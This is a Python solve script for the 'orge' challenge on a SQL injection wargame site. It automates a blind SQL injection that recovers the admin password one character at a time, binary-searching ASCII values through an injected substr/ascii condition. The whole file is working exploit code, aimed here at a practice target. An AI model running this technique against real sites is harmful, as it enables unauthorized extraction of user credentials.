import sys

import requests
from bs4 import BeautifulSoup

URL = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
PHPSESSID = sys.argv[1]

sess = requests.Session()
sess.cookies.set("PHPSESSID", PHPSESSID)


def ascii_at(index: int) -> str:
    print(f"[+] Character at index {index}")
    print(f"[+] Trying: ", end="")
    lo = 0
    hi = 127
    mid = 0
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        print(chr(mid), end="", flush=True)
        query = f"' || id='admin' && ascii(substr(pw, {index+1}, 1)) < {mid} -- "
        res = sess.get(URL, params={"pw": query})
        soup = BeautifulSoup(res.text, features="html.parser")
        if soup.h2 is not None:
            hi = mid
        else:
            lo = mid
    print()
    return chr(lo)


password = ""
for i in range(10):
    password += ascii_at(i)
    print(f"[+] Current password: {password}")
